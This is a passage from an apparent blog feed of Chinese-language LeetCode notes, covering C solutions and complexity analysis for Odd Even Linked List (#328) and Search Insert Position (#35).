class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">newNode</span> =</span> (<span class="keyword">struct</span> ListNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line">        newNode-&gt;val = oddPtr-&gt;val;</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">            newOddHead = newNode;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            oddPrevious-&gt;next = newNode;</span><br><span class="line">        &#125;</span><br><span class="line">        oddPrevious = newNode;</span><br><span class="line">        <span class="keyword">if</span> (oddPtr-&gt;next != <span class="literal">NULL</span> &amp;&amp; oddPtr-&gt;next-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            oddPtr = oddPtr-&gt;next-&gt;next;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    OddTail = oddPrevious;</span><br><span class="line">    <span class="keyword">if</span> (OddTail != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        OddTail-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create even list</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">evenPtr</span> =</span> head-&gt;next;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">newEvenHead</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">evenPrevious</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; evenCounter; i++) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">newNode</span> =</span> (<span class="keyword">struct</span> ListNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line">        newNode-&gt;val = evenPtr-&gt;val;</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">            newEvenHead = newNode;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            evenPrevious-&gt;next = newNode;</span><br><span class="line">        &#125;</span><br><span class="line">        evenPrevious = newNode;</span><br><span class="line">        <span class="keyword">if</span> (evenPtr-&gt;next != <span class="literal">NULL</span> &amp;&amp; evenPtr-&gt;next-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            evenPtr = evenPtr-&gt;next-&gt;next;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (evenPrevious != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        evenPrevious-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// merge two lists</span></span><br><span class="line">    <span class="keyword">if</span> (OddTail != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        OddTail-&gt;next = newEvenHead;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        newOddHead = newEvenHead;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> newOddHead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>首先，函數檢查輸入的list是否為空，如果是empty list，則直接返回 NULL。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> oddCounter = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> evenCounter = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">ptr</span> =</span> head;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(ptr != <span class="literal">NULL</span>)&#123;</span><br><span class="line">    counter++;</span><br><span class="line">    <span class="keyword">if</span> (counter % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">        evenCounter++;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        oddCounter++;</span><br><span class="line">    &#125;</span><br><span class="line">    ptr = ptr-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>這個部分主要是用來計算奇數和偶數節點各自的數量</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">oddPtr</span> =</span> head;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">newOddHead</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">OddTail</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">oddPrevious</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; oddCounter; i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">newNode</span> =</span> (<span class="keyword">struct</span> ListNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line">    newNode-&gt;val = oddPtr-&gt;val;</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">        newOddHead = newNode;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        oddPrevious-&gt;next = newNode;</span><br><span class="line">    &#125;</span><br><span class="line">    oddPrevious = newNode;</span><br><span class="line">    <span class="keyword">if</span> (oddPtr-&gt;next != <span class="literal">NULL</span> &amp;&amp; oddPtr-&gt;next-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        oddPtr = oddPtr-&gt;next-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">OddTail = oddPrevious;</span><br><span class="line"><span class="keyword">if</span> (OddTail != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    OddTail-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>上面這段則是要建立奇數 linked list</li><li>首先宣告的奇數的指標 <code>oddPtr</code>，用於走訪原本的List，<code>newOddHead</code>、<code>OddTail</code> 新的 Head 與 Tail，用於存放前一個節點的指標 <code>oddPrevious</code></li><li>接著就是在 for 迴圈中創建奇數節點，特別需要針對在 <code>i==0</code> 的時候指定新的 Head，其餘就將 <code>oddPrevious-&gt;next = newNode;</code> 在if-else判斷式之外，會將 <code>oddPrevious</code> 更新為當前節點，**接著就是讓 <code>oddPtr</code> 走訪到原始List的下下個節點(奇數)**，這裡需要小心的是，<code>oddPtr-&gt;next</code> 或者 <code>oddPtr-&gt;next-&gt;next</code> 可能會訪問到NULL，形成空指標，這會導致 RuntimeError，因此需要做判斷。</li><li>list建立完後，指定最後一個節點為 Tail 節點，並將其指向 NULL</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">evenPtr</span> =</span> head-&gt;next;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">newEvenHead</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">evenPrevious</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; evenCounter; i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">newNode</span> =</span> (<span class="keyword">struct</span> ListNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line">    newNode-&gt;val = evenPtr-&gt;val;</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">        newEvenHead = newNode;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        evenPrevious-&gt;next = newNode;</span><br><span class="line">    &#125;</span><br><span class="line">    evenPrevious = newNode;</span><br><span class="line">    <span class="keyword">if</span> (evenPtr-&gt;next != <span class="literal">NULL</span> &amp;&amp; evenPtr-&gt;next-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        evenPtr = evenPtr-&gt;next-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (evenPrevious != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    evenPrevious-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>偶數List做的事情一樣，差別是不用指定 Tail 節點</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (OddTail != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        OddTail-&gt;next = newEvenHead;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        newOddHead = newEvenHead;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> newOddHead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>最後就是合併Lists，將奇數list的Tail 接到偶數list的Head，之後回傳新的 head</li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/328/results1.png"></p><blockquote><p>這種作法感覺有點太過冗長，並且需要額外考慮很多空指標的狀況…</p></blockquote><h2 id="更好的做法"><a href="#更好的做法" class="headerlink" title="更好的做法"></a>更好的做法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">oddEvenList</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">NULL</span> || head-&gt;next == <span class="literal">NULL</span>) <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">oddPtr</span> =</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">evenPtr</span> =</span> head-&gt;next;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">evenHead</span> =</span> evenPtr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (evenPtr != <span class="literal">NULL</span> &amp;&amp; evenPtr-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        oddPtr-&gt;next = evenPtr-&gt;next;</span><br><span class="line">        oddPtr = oddPtr-&gt;next;</span><br><span class="line">        evenPtr-&gt;next = oddPtr-&gt;next;</span><br><span class="line">        evenPtr = evenPtr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    oddPtr-&gt;next = evenHead;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><blockquote><p>超級優美的寫法</p></blockquote><ul><li>一樣是先判斷是否有空鏈結，如果有就回傳null</li><li>這段代碼初始化了三個指標：<ul><li><code>oddPtr</code> 指向奇數位置的節點（初始指向 <code>head</code>）</li><li><code>evenPtr</code> 指向偶數位置的節點（初始指向 <code>head-&gt;next</code>）</li><li><code>evenHead</code> 用來保存偶數鏈表的頭指針，以便後續合併list</li></ul></li></ul><p>接著就是神奇的地方了</p><ul><li>只要把奇數節點的下一個鏈結到偶數節點的下一個，則可以建立奇數鏈結</li><li>只要把偶數節點的下一個鏈結到奇數節點的下一個，則可以建立偶數鏈結</li><li>最後將奇數的指標接到偶數的Head 即完成</li></ul><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/328/results2.png"></p><h2 id="複雜度分析-我的解法"><a href="#複雜度分析-我的解法" class="headerlink" title="複雜度分析- 我的解法"></a>複雜度分析- 我的解法</h2><h3 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h3><ul><li>計算節點數量:程式碼首先遍歷整個linked list以計算鏈表的長度 n。這個操作的時間複雜度是 $O(n)$，其中 n 是 list 的節點數量</li><li>創建奇數索引linked list: 根據奇數索引的節點數量 <code>oddCounter</code> 遍歷原始list，創建一個新的奇數索引list。<strong>由於 <code>oddCounter</code> 最大為 <code>n/2</code>，因此創建過程的時間複雜度為 $O(n)$</strong></li><li>創建偶數索引linked list: 根據奇數索引的節點數量 <code>evenCounter</code> 遍歷原始list，創建一個新的奇數索引list。<strong>由於 <code>evenCounter</code> 最大為 <code>n/2</code>，因此創建過程的時間複雜度為 $O(n)$</strong></li><li>最後，合併兩個鏈表的操作是常數時間的 $O(1)$</li></ul><h3 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h3><p>除了存儲原始list之外，程式碼使用了額外的空間來存儲新創建的奇數索引和偶數索引list的節點。<br><code>oddCounter</code> 和 <code>evenCounter</code> 分別代表奇數索引和偶數索引的節點數量。最壞情況下，它們各自最多為 <code>n/2</code>，因此額外空間複雜度為 $O(n)$</p><blockquote><p>因此這不滿足題目要求</p></blockquote><h2 id="複雜度分析-另一個解法"><a href="#複雜度分析-另一個解法" class="headerlink" title="複雜度分析- 另一個解法"></a>複雜度分析- 另一個解法</h2><h3 id="時間複雜度-1"><a href="#時間複雜度-1" class="headerlink" title="時間複雜度"></a>時間複雜度</h3><p>只做了單次traverse，程式碼只需一次遍歷整個List，並在遍歷過程中執行節點的重新排列操作。<br>因此，時間複雜度為 $O(n)$，其中 n 是節點數量</p><h3 id="空間複雜度-1"><a href="#空間複雜度-1" class="headerlink" title="空間複雜度"></a>空間複雜度</h3><p>程式碼僅使用了幾個額外的指標變數來記錄奇數節點 <code>oddPtr</code>、偶數節點 <code>evenPtr</code> 以及偶數節點鏈表的頭部 <code>evenHead</code><br>因此，額外空間的使用是常數級別的 $O(1)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Medium </tag>
            
            <tag> Linked List </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>尋找插入位置 | Easy | LeetCode#35 Search Insert Position</title>
      <link href="/posts/search_insert_position.html"/>
      <url>/posts/search_insert_position.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/35/question.png"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 給定已排序的整數陣列，以及一個目標值，若再陣列中找到目標值就返回 index，如果沒有就返回適合插入的位址。另外題目也要求實作演算法的複雜度要是 $O(log n)$。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><ul><li>針對已排序的陣列，尋找目標值的方法使用 <strong>Binary Search</strong> 可以滿足需求</li></ul><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">searchInsert</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    <span class="type">int</span> right, left, mid;</span><br><span class="line">    right = numsSize<span class="number">-1</span>;  </span><br><span class="line">    left = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">        mid = left + (right - left)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &lt; nums[mid])&#123;     </span><br><span class="line">            right = mid; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (target &gt; nums[mid])&#123;</span><br><span class="line">            left = mid+<span class="number">1</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (left == right)&#123;  </span><br><span class="line">        <span class="keyword">if</span> (target &lt; nums[left])&#123;              </span><br><span class="line">            mid= left;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (target &gt; nums[left])&#123;  </span><br><span class="line">            mid = left+<span class="number">1</span>;    </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            mid = left;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>這裡就是經典的 Binary Search 寫法，設定左右界，計算中間值，當 <code>left &lt; right</code> 的時候就改變搜尋範圍</li><li>如果目標值 &lt; 中間值，就尋找中間值左側的區塊，因此將 <code>right=mid</code></li><li>如果目標值 &gt; 中間值，就尋找中間值右側的區塊，因此將 <code>left=mid+1</code></li><li>如果過程中如果目標值 &#x3D; 中間值，就返回中間值</li><li>這裡與平常使用 Binary Search 不同的是，這裡將 <code>left = right</code> 單獨出來處理，因為題目要求如果沒有找到 target 值，需要返回適合插入的 index。</li><li>當沒找到 target 值時，若 target值 &lt; 目前的 <code>left</code> 或 <code>right</code>，則適合插入值會是 <code>left</code> 或 <code>right</code></li><li>當沒找到 target 值時，若 target值 &gt; 目前的 <code>left</code> 或 <code>right</code>，則適合插入值會是 <code>left+1</code> 或 <code>right+1</code></li><li>當沒找到 target 值時，若 target值 &#x3D; 目前的 <code>left</code> 或 <code>right</code>，則適合插入值會是 <code>left</code> 或 <code>right</code></li><li>接著就回傳index 值</li></ul><h3 id="完整測試程式碼"><a href="#完整測試程式碼" class="headerlink" title="完整測試程式碼"></a>完整測試程式碼</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">searchInsert</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> nums[<span class="number">2</span>]= &#123;<span class="number">1</span>,<span class="number">3</span>&#125;;</span><br><span class="line">    <span class="type">int</span> target = <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Middle:%d\n&quot;</span>, searchInsert(nums, <span class="number">2</span>, target));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">searchInsert</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span>&#123;</span><br><span class="line">    <span class="type">int</span> right, left, mid;</span><br><span class="line">    right = numsSize<span class="number">-1</span>;</span><br><span class="line">    left = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(left &lt; right)&#123;   </span><br><span class="line">        mid = left + (right - left)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &lt; nums[mid])&#123;     </span><br><span class="line">            right = mid; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (target &gt; nums[mid])&#123; </span><br><span class="line">            left = mid+<span class="number">1</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (left == right)&#123; </span><br><span class="line">        <span class="keyword">if</span> (target &lt; nums[left])&#123;                </span><br><span class="line">            mid= left;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (target &gt; nums[left])&#123;  </span><br><span class="line">            mid= left+<span class="number">1</span>;    </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            mid = left;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/35/results.png"></p><h2 id="修正程式碼"><a href="#修正程式碼" class="headerlink" title="修正程式碼"></a>修正程式碼</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">searchInsert</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    <span class="type">int</span> right, left, mid;</span><br><span class="line">    right = numsSize<span class="number">-1</span>;  </span><br><span class="line">    left = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">        mid = left + (right - left)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &lt; nums[mid])&#123;     </span><br><span class="line">            right = mid<span class="number">-1</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (target &gt; nums[mid])&#123;</span><br><span class="line">            left = mid+<span class="number">1</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> left;</span><br></pre></td></tr></table></figure><blockquote><p><code>left = right</code> 其實也不用單獨出來處理，只要當 <code>target &lt; nums[mid]</code> 時再取 right 的時候取小一些，並且在 <code>left &gt; right</code> 也就是找不到值的時候，回傳 <code>left</code> 則會是最適合插入的位置</p></blockquote><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/35/results2.png"></p><blockquote><p>好像執行時間沒比較快，哈</p></blockquote><h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><h3 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h3><p>這段程式碼的主要結構是一個 while 迴圈，迴圈內部實現了二元搜索。它的特點是每次迴圈都將搜索範圍縮小一半，因此其時間複雜度是 $O(log n)$，其中 <code>n</code> 是陣列的大小 <code>numsSize</code>。</p><p>初始化操作是 $O(1)$。<br>while 迴圈中的每一次迭代，<strong>搜索範圍減少一半。這意味著迴圈最多運行 $log(n)$ 次</strong><br>在每次迭代中，所有操作（如計算 mid、比較、賦值等）都是 $O(1)$<br>因此，整體時間複雜度為 $O(log n)$</p><h3 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h3><p>這段程式碼使用了一些額外的變量來儲存索引和中間結果，但這些變量的數量與輸入陣列的大小無關，都是常數數量的額外空間。</p><p>變數 <code>right</code>、<code>left</code>、<code>mid</code> 和 <code>target</code> 都是固定數量的整數變量。<br>程式碼中沒有使用任何額外的數組或動態分配的空間。<br>因此，整體空間複雜度為 $O(1)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
